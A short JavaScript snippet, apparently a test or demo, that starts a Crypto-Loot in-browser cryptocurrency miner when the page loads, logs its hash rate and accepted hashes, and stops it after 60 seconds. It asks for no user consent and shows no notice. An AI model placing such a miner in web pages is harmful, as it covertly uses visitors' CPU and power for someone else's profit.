$('document').ready(function () {
  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
    autoThreads: false,
    throttle: 0.7
  })
  miner.start()
  setInterval(function () {
    var hashesPerSecond = miner.getHashesPerSecond()
    console.log(hashesPerSecond)
  }, 3000)
  miner.on('found', function () {
    console.log('Hash found')
  })
  miner.on('accepted', function () {
    console.log('Hash accepted')
  })
  miner.getHashesPerSecond()
  setTimeout(function () {
    miner.stop()
    console.log('Miner stopped after 60 seconds')
  }, 60000)
})
